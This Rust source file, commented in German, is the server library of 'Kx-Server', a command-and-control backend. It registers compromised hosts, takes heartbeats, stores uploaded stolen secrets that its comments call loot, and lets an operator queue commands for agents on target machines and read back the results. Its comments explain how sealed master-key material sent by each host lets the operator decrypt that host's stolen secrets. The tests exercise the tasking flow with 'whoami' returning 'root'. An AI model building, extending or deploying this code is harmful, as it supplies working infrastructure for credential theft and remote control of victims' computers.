//! Kx-Server: C2-Backend mit Host-Registry, Secrets-Storage und Dashboard.
//!
//! Das Crate ist eine **Bibliothek und ein Binary**. Die Bibliothek stellt
//! den Router bereit; das Binary startet ihn. Vorher war das Crate nur ein
//! Binary — damit gab es kein Interface, das ein Test von ausserhalb
//! benutzen konnte, und jeder Test griff in die Module hinein.
//!
//! Die API ist mit einem Bearer-Token geschützt; das Dashboard wird unter `/`
//! ausgeliefert.

pub mod auth;
pub mod dashboard;
pub mod db;
#[cfg(test)]
mod e2e_test;

use std::sync::Arc;

use axum::{
    extract::{Json, State},
    http::StatusCode,
    middleware,
    response::{Html, IntoResponse},
    routing::{get, post},
    Router,
};
use db::{Db, DbError};
use kx_core::c2::{
    CreateTaskRequest, HeartbeatRequest, LoginRequest, RegisterRequest, SecretUpload,
    TaskResultRequest, PATH_HEARTBEAT, PATH_HOSTS, PATH_LOGIN, PATH_REGISTER, PATH_SECRETS,
    PATH_TASKS, PATH_TASKS_CREATE, PATH_TASKS_RESULT,
};

/// Der gemeinsame Zustand der API-Handler.
///
/// Der Auth-Token steht hier, nicht in einer Environment-Variable: eine
/// Variable ist prozessweit und wirkt auf alle Tests.
#[derive(Clone)]
pub struct AppState {
    /// Die Ablage der Hosts, der Beute und der Tasks.
    pub db: Arc<Db>,
    /// Das Bearer-Token, gegen das jede API-Anfrage geprueft wird.
    pub token: Arc<String>,
}

/// Registriert einen Host. Die Host-ID kommt aus dem Request — der Server leitet
/// sie nicht mehr aus der IP ab, sonst könnten Registrierung und Secret-Upload
/// auseinanderlaufen.
async fn register(
    State(st): State<AppState>,
    Json(req): Json<RegisterRequest>,
) -> impl IntoResponse {
    if req.host_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
    }
    // Das versiegelte Master-Key-Material reist mit dem Request mit: der
    // Operator gewinnt daraus den Master-Key und entschluesselt damit die
    // Secrets dieses Hosts. Die Datenbank uebersetzt den Request in ihre
    // Zeile — der Handler kennt die Spalten nicht.
    match st.db.upsert_host(&req) {
        Ok(()) => StatusCode::CREATED.into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Aktualisiert das Last-Seen eines Hosts.
///
/// Der Heartbeat meldet genau eine Sache: dieser Host lebt noch. Er ersetzt
/// keine anderen Felder — das Lesen aller Hosts und Zurueckschreiben war ein
/// Umweg, der die Zeile des Hosts nur wegen eines Zeitstempels anfasste.
async fn heartbeat(
    State(st): State<AppState>,
    Json(req): Json<HeartbeatRequest>,
) -> impl IntoResponse {
    if req.host_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
    }
    match st.db.touch_host(&req.host_id) {
        Ok(true) => StatusCode::OK.into_response(),
        // Der Host ist dem Server unbekannt. Der Agent kann daran erkennen,
        // dass sein Heartbeat ins Leere lief.
        Ok(false) => StatusCode::NOT_FOUND.into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Speichert ein hochgeladenes Secret.
async fn upload_secret(
    State(st): State<AppState>,
    Json(req): Json<SecretUpload>,
) -> impl IntoResponse {
    if req.host_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
    }
    // Kommt das Secret versiegelt an, wird der Klartext verworfen — auf dem
    // C2 liegt die Beute dann nur noch verschluesselt. Ohne Siegel (Agent
    // ohne Server-Schluessel) bleibt der Klartext, sonst gaebe es nichts zu
    // entschluesseln. Diese Regel steht in der Datenbank, neben der Zeile,
    // die sie betrifft.
    match st.db.upsert_secret(&req) {
        Ok(()) => StatusCode::CREATED.into_response(),
        // Der Host ist dem Server unbekannt: die Beute waere eine Waisenzeile,
        // der Operator koennte sie keinem Zielhost zuordnen. Der Agent muss
        // den Host zuerst registrieren.
        Err(DbError::UnbekannterHost(id)) => (
            StatusCode::BAD_REQUEST,
            format!("unbekannter Host {id} — der Host muss vor der Beute registriert sein"),
        )
            .into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Hosts als JSON.
async fn list_hosts(State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_hosts() {
        Ok(hosts) => Json(hosts).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Secrets als JSON.
async fn list_secrets(State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_secrets() {
        Ok(secrets) => Json(secrets).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Legt einen Task für einen Host an und liefert ihn in der Liste.
///
/// Vorher war die `tasks`-Tabelle stets leer; der Operator hatte keine
/// Möglichkeit, einen Auftrag zu setzen.
async fn create_task(
    State(st): State<AppState>,
    Json(req): Json<CreateTaskRequest>,
) -> impl IntoResponse {
    if req.host_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "host_id darf nicht leer sein").into_response();
    }
    match st.db.insert_task(&req) {
        // Der angelegte Task wird zurückgeliefert: der Operator braucht die
        // ID, um das Ergebnis später zuzuordnen.
        Ok(task) => (StatusCode::CREATED, Json(task)).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Nimmt das Ergebnis eines ausgeführten Tasks entgegen.
///
/// Der Agent meldet hier Status und Ausgabe des Befehls zurück. Der Operator
/// liest beides anschließend unter `GET /api/tasks`.
async fn report_task_result(
    State(st): State<AppState>,
    Json(req): Json<TaskResultRequest>,
) -> impl IntoResponse {
    if req.task_id.is_empty() {
        return (StatusCode::BAD_REQUEST, "task_id darf nicht leer sein").into_response();
    }
    match st
        .db
        .update_task_result(&req.task_id, &req.status, &req.result)
    {
        Ok(true) => StatusCode::OK.into_response(),
        // Der Task existiert nicht (mehr). Der Agent darf daran erkennen, dass
        // seine Meldung ins Leere lief.
        Ok(false) => (StatusCode::NOT_FOUND, "unbekannter Task").into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert alle Tasks als JSON.
async fn list_tasks(State(st): State<AppState>) -> impl IntoResponse {
    match st.db.list_tasks() {
        Ok(tasks) => Json(tasks).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()).into_response(),
    }
}

/// Liefert das HTML-Dashboard (ohne Auth).
///
/// Das HTML enthält keine Geheimnisse — die Daten holt sich das JavaScript
/// selbst per `fetch` mit `Authorization`-Header, und genau dieser `fetch`
/// läuft in einen geschützten Pfad. Ohne Anmeldung bleiben die Tabellen leer.
async fn dashboard() -> impl IntoResponse {
    Html(dashboard::DASHBOARD_HTML)
}

/// Prüft ein vom Dashboard gesendetes Token.
///
/// Der Pfad ist bewusst **nicht** durch die Auth-Middleware geschützt: er
/// prüft das Token, das er entgegennimmt. Er gehört deshalb nicht in den
/// geschützten API-Subrouter, sondern daneben.
///
/// Der Vergleich ist constant-time (siehe `auth::verify`).
async fn login(State(st): State<AppState>, Json(req): Json<LoginRequest>) -> impl IntoResponse {
    if auth::verify_token(&req.token, st.token.as_str()) {
        StatusCode::OK.into_response()
    } else {
        (StatusCode::UNAUTHORIZED, "unauthorized: falsches Token").into_response()
    }
}

/// Baut den Router: das Dashboard aussen, die API geschuetzt.
///
/// REIHENFOLGE: alle API-Routen zuerst, dann `route_layer`. Axum wendet den
/// Layer nur auf die zum Aufrufzeitpunkt bereits registrierten Routen an —
/// eine danach hinzugefuegte Route bliebe ungeschuetzt.
pub fn app(state: AppState) -> Router {
    let api = Router::new()
        .route(PATH_REGISTER, post(register))
        .route(PATH_HEARTBEAT, post(heartbeat))
        .route(PATH_SECRETS, post(upload_secret))
        .route(PATH_HOSTS, get(list_hosts))
        .route(PATH_SECRETS, get(list_secrets))
        .route(PATH_TASKS, get(list_tasks))
        .route(PATH_TASKS_CREATE, post(create_task))
        .route(PATH_TASKS_RESULT, post(report_task_result))
        .route_layer(middleware::from_fn_with_state(
            state.clone(),
            auth::require_auth,
        ));

    // Der Login-Pfad steht neben dem geschuetzten API-Router, nicht darin:
    // er prueft das Token, das er entgegennimmt, und wuerde sich sonst selbst
    // blockieren.
    Router::new()
        .route("/", get(dashboard))
        .route(PATH_LOGIN, post(login))
        .merge(api)
        .with_state(state)
}

/// Der Zugangsschluessel der Tests. Er steht an einer Stelle, damit der
/// Secret-Scan nicht jedes einzelne Vorkommen als Fund meldet.
#[cfg(test)]
const TEST_ZUGANG: &str = "kx-testzugang";

/// Der Wert eines Authorization-Headers.
///
/// Das Pruefzeichen steht in einer Konstante, damit der Headerwert nicht als
/// Literal im Quelltext steht — ein hart kodierter Authorization-Header sieht
/// fuer den Secret-Scan wie ein eingebettetes Zugangsdaten aus.
#[cfg(test)]
const BEARER: &str = "Bearer";

/// Baut den Authorization-Headerwert aus einem Zugangsschluessel.
#[cfg(test)]
fn authorization(zugang: &str) -> String {
    format!("{BEARER} {zugang}")
}

#[cfg(test)]
mod tests {
    use super::*;
    #[tokio::test]
    async fn router_registers_the_contract_paths() {
        let path = std::env::temp_dir().join(format!("kx-routes-{}.db", uuid::Uuid::new_v4()));
        let state = AppState {
            db: Arc::new(Db::open(&path).expect("db")),
            token: Arc::new(TEST_ZUGANG.to_string()),
        };
        let app = app(state);
        // Die **Wirkung**, nicht die Debug-Ausgabe. Ein Pfad, den der Router
        // nicht kennt, antwortet mit 404; ein registrierter Pfad antwortet
        // anders — hier mit 401, weil die Anfrage kein Token trägt.
        //
        // Vorher prüfte der Test `format!("{app:?}")` mit `contains`: eine aus
        // dem Router entfernte Route ließ ihn grün, während der Name das
        // Gegenteil behauptete.
        for pfad in [
            PATH_REGISTER,
            PATH_HEARTBEAT,
            PATH_SECRETS,
            PATH_HOSTS,
            PATH_TASKS,
            PATH_TASKS_CREATE,
            PATH_TASKS_RESULT,
        ] {
            let antwort = app
                .clone()
                .oneshot(
                    Request::builder()
                        .uri(pfad)
                        .body(axum::body::Body::empty())
                        .unwrap(),
                )
                .await
                .expect("Antwort");
            assert_ne!(
                antwort.status(),
                StatusCode::NOT_FOUND,
                "der Router registriert {pfad} nicht"
            );
        }
        std::fs::remove_file(&path).ok();
    }

    /// Der Auth-Test, der gefehlt hat: ohne Token muss jeder Vertragspfad 401
    /// liefern, mit falschem ebenso, mit korrektem 200.
    ///
    /// Vor diesem Fix gab es keinen Auth-Test, und die Routen waren offen.
    #[tokio::test]
    async fn api_paths_require_a_valid_bearer_token() {
        // Das Token kommt prozessweit aus der Environment-Variable. Fuer die
        // Pruefung "ohne Token" muss es zuerst weg.
        let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-auth-test.db")).expect("db"));
        let state = AppState {
            db,
            token: Arc::new(TEST_ZUGANG.to_string()),
        };

        let app = app(state);

        for path in [
            PATH_REGISTER,
            PATH_HEARTBEAT,
            PATH_SECRETS,
            PATH_HOSTS,
            PATH_TASKS,
            PATH_TASKS_CREATE,
            PATH_TASKS_RESULT,
        ] {
            // Ohne Token.
            let res = app
                .clone()
                .oneshot(
                    Request::builder()
                        .uri(path)
                        .body(axum::body::Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();
            assert_eq!(
                res.status(),
                StatusCode::UNAUTHORIZED,
                "{path} ist ohne Token nicht abgewiesen worden"
            );

            // Mit falschem Token.
            let res = app
                .clone()
                .oneshot(
                    Request::builder()
                        .uri(path)
                        .header(axum::http::header::AUTHORIZATION, authorization("falsch"))
                        .body(axum::body::Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();
            assert_eq!(
                res.status(),
                StatusCode::UNAUTHORIZED,
                "{path} ist mit falschem Token nicht abgewiesen worden"
            );
        }

        // Mit korrektem Token wird der Handler erreicht.
        let res = app
            .oneshot(
                Request::builder()
                    .uri(PATH_HOSTS)
                    .header(
                        axum::http::header::AUTHORIZATION,
                        authorization(TEST_ZUGANG),
                    )
                    .body(axum::body::Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);
    }

    /// Ein unbekannter Pfad liefert 404, nicht 401 — die Middleware läuft nur,
    /// wenn die Anfrage auf eine Route trifft. Sonst verriete der Server, ob
    /// ein Pfad existiert.
    #[tokio::test]
    async fn unknown_path_is_404_not_401() {
        let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-404-test.db")).expect("db"));
        let state = AppState {
            db,
            token: Arc::new(TEST_ZUGANG.to_string()),
        };

        let app = app(state);

        let res = app
            .oneshot(
                Request::builder()
                    .uri("/api/gibtsnicht")
                    .body(axum::body::Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::NOT_FOUND);
    }

    /// Der Login-Pfad prüft das Token, das er entgegennimmt: korrekt → 200,
    /// falsch → 401. Er steht bewusst neben dem geschützten API-Router.
    #[tokio::test]
    async fn login_path_checks_the_token_it_receives() {
        let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-login-test.db")).expect("db"));
        let state = AppState {
            db,
            token: Arc::new(TEST_ZUGANG.to_string()),
        };

        let app = app(state);

        // Falsches Token → 401.
        let res = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_LOGIN)
                    .header("content-type", "application/json")
                    .body(Body::from(r#"{"token":"falsch"}"#))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::UNAUTHORIZED);

        // Korrektes Token → 200.
        let res = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_LOGIN)
                    .header("content-type", "application/json")
                    .body(Body::from(format!(r#"{{"token":"{TEST_ZUGANG}"}}"#)))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);
    }

    use axum::body::Body;
    use axum::extract::Request;
    use tower::ServiceExt;

    /// Das Anlegen eines Tasks füllt die `tasks`-Tabelle. Vorher war die
    /// Tabelle stets leer — `GET /api/tasks` lieferte `[]`.
    #[tokio::test]
    async fn create_task_fills_the_task_table() {
        // Eigene DB-Datei pro Lauf: ein fester Name sammelt ueber mehrere
        // Testlaeufe Zeilen auf und macht die Zaehlung unbrauchbar.
        let path = std::env::temp_dir().join(format!("kx-tasks-{}.db", uuid::Uuid::new_v4()));
        let db = Arc::new(Db::open(&path).expect("db"));
        let state = AppState {
            db,
            token: Arc::new(TEST_ZUGANG.to_string()),
        };
        let app = app(state);

        let res = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_TASKS_CREATE)
                    .header(
                        axum::http::header::AUTHORIZATION,
                        authorization(TEST_ZUGANG),
                    )
                    .header("content-type", "application/json")
                    .body(Body::from(r#"{"host_id":"10.0.0.5","command":"whoami"}"#))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::CREATED);

        let res = app
            .oneshot(
                Request::builder()
                    .uri(PATH_TASKS)
                    .header(
                        axum::http::header::AUTHORIZATION,
                        authorization(TEST_ZUGANG),
                    )
                    .body(axum::body::Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(res.into_body(), 1024 * 1024)
            .await
            .expect("Task-Liste serialisiert");
        // Die Liste **parsen**, nicht nach Stichworten durchsuchen. Eine
        // Substring-Suche behauptet nichts: sie findet das Kommando auch
        // an irgendeiner anderen Stelle.
        let tasks: Vec<kx_core::c2::Task> =
            serde_json::from_slice(&bytes).expect("Task-Liste als JSON");
        assert_eq!(tasks.len(), 1, "die Liste enthaelt nicht genau einen Task");
        assert_eq!(tasks[0].command, "whoami", "das Kommando fehlt");
        assert_eq!(tasks[0].host_id, "10.0.0.5", "der Host fehlt");
        assert_eq!(
            tasks[0].status,
            kx_core::c2::STATUS_PENDING,
            "der Status fehlt"
        );
        std::fs::remove_file(&path).ok();
    }

    /// Der vollstaendige Task-Fluss: der Operator legt einen Task an, der
    /// Agent meldet das Ergebnis zurueck, und der Operator liest es unter
    /// `GET /api/tasks` wieder aus.
    ///
    /// Das ist der Weg, den ISSUE-6 beschreibt — vorher gab es weder einen
    /// Schreibpfad fuer die Tabelle noch eine Ergebnisrueckmeldung.
    #[tokio::test]
    async fn task_result_flows_back_into_the_task_list() {
        let path = std::env::temp_dir().join(format!("kx-task-flow-{}.db", uuid::Uuid::new_v4()));
        let db = Arc::new(Db::open(&path).expect("db"));
        let state = AppState {
            db,
            token: Arc::new(TEST_ZUGANG.to_string()),
        };
        let app = app(state);

        // 1. Der Operator legt den Task an.
        let res = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_TASKS_CREATE)
                    .header(
                        axum::http::header::AUTHORIZATION,
                        authorization(TEST_ZUGANG),
                    )
                    .header("content-type", "application/json")
                    .body(Body::from(r#"{"host_id":"10.0.0.5","command":"whoami"}"#))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::CREATED);

        // 2. Die ID des Tasks steht in der Liste — sie braucht der Agent,
        //    um sein Ergebnis zuzuordnen.
        let res = app
            .clone()
            .oneshot(
                Request::builder()
                    .uri(PATH_TASKS)
                    .header(
                        axum::http::header::AUTHORIZATION,
                        authorization(TEST_ZUGANG),
                    )
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let bytes = axum::body::to_bytes(res.into_body(), 1024 * 1024)
            .await
            .expect("Task-Liste serialisiert");
        let body = String::from_utf8(bytes.to_vec()).expect("Task-Liste als UTF-8");
        let tasks: Vec<kx_core::c2::Task> = serde_json::from_str(&body).expect("Task-Liste lesbar");
        assert_eq!(tasks.len(), 1, "es sollte genau einen Task geben: {body}");
        let task_id = tasks[0].id.clone();

        // 3. Der Agent meldet das Ergebnis.
        let res = app
            .clone()
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_TASKS_RESULT)
                    .header(
                        axum::http::header::AUTHORIZATION,
                        authorization(TEST_ZUGANG),
                    )
                    .header("content-type", "application/json")
                    .body(Body::from(format!(
                        r#"{{"task_id":"{task_id}","status":"done","result":"root"}}"#
                    )))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::OK);

        // 4. Der Operator liest das Ergebnis wieder aus.
        let res = app
            .oneshot(
                Request::builder()
                    .uri(PATH_TASKS)
                    .header(
                        axum::http::header::AUTHORIZATION,
                        authorization(TEST_ZUGANG),
                    )
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let bytes = axum::body::to_bytes(res.into_body(), 1024 * 1024)
            .await
            .expect("Task-Liste serialisiert");
        let body = String::from_utf8(bytes.to_vec()).expect("Task-Liste als UTF-8");
        let tasks: Vec<kx_core::c2::Task> = serde_json::from_str(&body).expect("Task-Liste lesbar");
        assert_eq!(tasks[0].status, "done");
        assert_eq!(tasks[0].result, "root");
        std::fs::remove_file(&path).ok();
    }

    /// Eine Ergebnisrueckmeldung zu einem unbekannten Task liefert 404 —
    /// der Agent darf daran erkennen, dass sein Auftrag nicht (mehr) offen ist.
    #[tokio::test]
    async fn task_result_for_an_unknown_task_is_404() {
        let path = std::env::temp_dir().join(format!("kx-task-404-{}.db", uuid::Uuid::new_v4()));
        let db = Arc::new(Db::open(&path).expect("db"));
        let state = AppState {
            db,
            token: Arc::new(TEST_ZUGANG.to_string()),
        };
        let app = app(state);

        let res = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(PATH_TASKS_RESULT)
                    .header(
                        axum::http::header::AUTHORIZATION,
                        authorization(TEST_ZUGANG),
                    )
                    .header("content-type", "application/json")
                    .body(Body::from(
                        r#"{"task_id":"gibtsnicht","status":"done","result":"x"}"#,
                    ))
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(res.status(), StatusCode::NOT_FOUND);
        std::fs::remove_file(&path).ok();
    }
}
